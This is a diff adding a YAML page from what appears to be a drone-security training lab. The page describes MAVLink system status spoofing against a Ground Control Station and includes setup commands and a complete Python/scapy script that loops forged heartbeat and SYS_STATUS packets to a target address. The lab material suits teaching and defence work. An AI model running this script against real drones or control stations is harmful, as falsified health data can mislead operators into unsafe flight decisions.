@@ -1,0 +1,123 @@
+title: System Status Spoofing
+order: 9
+description: Spoofing the system status data to mislead the Ground Control Station (GCS) about the drone's system health.
+breadcrumb:
+  - text: Attack Scenarios
+    link: /attacks
+  - text: Reconnaissance
+  - text: System Status Spoofing
+
+sections:
+  - title: Description
+    content: |
+      System Status spoofing involves sending false system status data to the Ground 
+      Control Station (GCS) to mislead it about the drone's actual system health. This 
+      can cause the operator to make incorrect decisions based on the spoofed data.
+
+  - title: Resources
+    content:
+      - text: MAVLink Protocol
+        link: https://mavlink.io/en/
+      - text: PyMAVLink Documentation
+        link: https://www.ardusub.com/developers/pymavlink.html
+
+  - title: Solution Guide
+    collapsible: true
+    steps:
+      - title: Step 1. Setup
+        description: |
+          Ensure you have Python and the necessary libraries installed:
+          ```sudo apt-get update
+          sudo apt-get install python3 python3-pip
+          pip3 install pymavlink scapy
+          ```
+
+      - title: Step 2. Create the Script
+        description: |
+          Create a Python script named `sys-status-spoofing.py` and paste the following code:
+          ```from pymavlink import mavutil
+          from scapy.all import *
+          import time
+          import sys
+
+          def create_heartbeat():
+              """
+              Create a MAVLink heartbeat message.
+              """
+              mav = mavutil.mavlink.MAVLink(None)
+              mav.srcSystem = 1
+              mav.srcComponent = 1
+
+              heartbeat = mav.heartbeat_encode(
+                  type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
+                  autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
+                  base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
+                  custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
+                  system_status=mavutil.mavlink.MAV_STATE_ACTIVE
+              )
+              
+              return heartbeat.pack(mav)
+
+          def create_sys_status():
+              """
+              Create a MAVLink SYS_STATUS message with low battery and high load values.
+              """
+              mav = mavutil.mavlink.MAVLink(None)
+              mav.srcSystem = 1
+              mav.srcComponent = 1
+
+              sys_status = mav.sys_status_encode(
+                  onboard_control_sensors_present=0b11111111111111111111111111111111,  # All sensors present
+                  onboard_control_sensors_enabled=0b11111111111111111111111111111111,  # All sensors enabled
+                  onboard_control_sensors_health=0b11111111111111111111111111111111,  # All sensors healthy
+                  load=1000,  # System load (0.1% increments)
+                  voltage_battery=0,  # Battery voltage (mV)
+                  current_battery=-1,  # Battery current (10 * mA)
+                  battery_remaining=-1,  # Remaining battery energy (0%: 0, 100%: 100)
+                  drop_rate_comm=0,  # Communication drop rate (% * 100)
+                  errors_comm=0,  # Communication errors
+                  errors_count1=0,  # First sensor error count
+                  errors_count2=0,  # Second sensor error count
+                  errors_count3=0,  # Third sensor error count
+                  errors_count4=0   # Fourth sensor error count
+              )
+
+              return sys_status.pack(mav)
+
+          def send_mavlink_packet(packet_data, target_ip, target_port):
+              """
+              Send a MAVLink packet using Scapy.
+              """
+              packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
+              send(packet)
+
+          if __name__ == "__main__":
+              if len(sys.argv) != 2:
+                  print("Usage: python sys_status-spoof.py <ip:port>")
+                  sys.exit(1)
+
+              target = sys.argv[1]
+              target_ip, target_port = target.split(':')
+              target_port = int(target_port)
+
+              while True:
+                  heartbeat_packet = create_heartbeat()
+                  sys_status_packet = create_sys_status()
+
+                  send_mavlink_packet(heartbeat_packet, target_ip, target_port)
+                  send_mavlink_packet(sys_status_packet, target_ip, target_port)
+                  
+                  print(f"Sent heartbeat and SYS_STATUS packets to {target_ip}:{target_port}")
+
+          ```
+
+      - title: Step 3. Run the Script
+        description: |
+          Execute the script with sudo and the target GCS IP and port:
+          ```sudo python sys-status-spoofing.py <ip:port>
+          ```
+          Replace `<ip:port>` with the actual IP address and port of the QGroundControl App using `10.13.0.6:14550` or the GCS (MAVProxy) using `192.168.13.14:14550`/`10.13.0.4:14550`
+
+      - title: Step 4. Monitor the Effects
+        description: |
+          Observe the GCS to see the spoofed SYS_STATUS data being displayed. The drone's system status will appear different from its actual state.
